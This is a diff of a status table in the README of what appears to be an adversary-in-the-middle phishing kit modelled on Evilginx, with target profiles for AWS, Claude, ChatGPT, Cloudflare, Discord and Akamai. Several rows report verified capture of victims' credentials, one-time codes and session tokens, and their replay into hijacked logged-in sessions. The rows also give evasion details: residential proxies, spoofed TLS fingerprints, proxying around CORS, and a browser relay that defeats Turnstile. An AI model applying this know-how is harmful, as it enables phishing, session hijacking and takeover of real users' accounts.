@@ -28,7 +28,7 @@ Evilginx Pro-class features clean-room for internal / air-gapped environments.
 | `aws` | ⚠️ unverified — AWS WAF 403s datacenter IPs at `/signin`; fields `username`/`password`/`mfaCode` |
 | `claude` | ✅ **verified E2E** — login-code flow (email + 6-digit code, no password) captured as JSON creds; `sessionKey` token captured and **replayed into a logged-in session**; CF-protected — needs `proxy: true` + residential + `tlsfp: chrome` |
 | `chatgpt` | ✅ **verified E2E** — password + OTP captured as JSON; chunked `__Secure-next-auth.session-token.0/.1` captured and **replayed into the victim's logged-in ChatGPT**; needs `proxy: true` + residential + auth-cdn proxied (CORS trap). Note: email travels in the URL query only |
-| `cloudflare` | 🔁 **relay-capable** — classic MITM is blocked by a domain-locked Turnstile on the login button, but the generalized real-browser relay covers it (`profiles/cloudflare.yaml` + `relay: true` lure); awaiting a real-account E2E |
+| `cloudflare` | 🅿️ **parked** — MITM is structurally blocked (domain-locked Turnstile on the login button); the generalized relay covers it (`profiles/cloudflare.yaml` + `relay: true`) and passed the full fake-credential loop — parked pending a real-account E2E |
 | `discord` | ⚠️ unverified — SPA proxied (login renders through it); JSON creds `login`/`password` + TOTP `code`; bearer token lives in localStorage — credentials capture only |
 | `akamai` | ⚠️ unverified — Control Center auth renders through the proxy (`username`/`password`); session cookie set needs an account test |
 
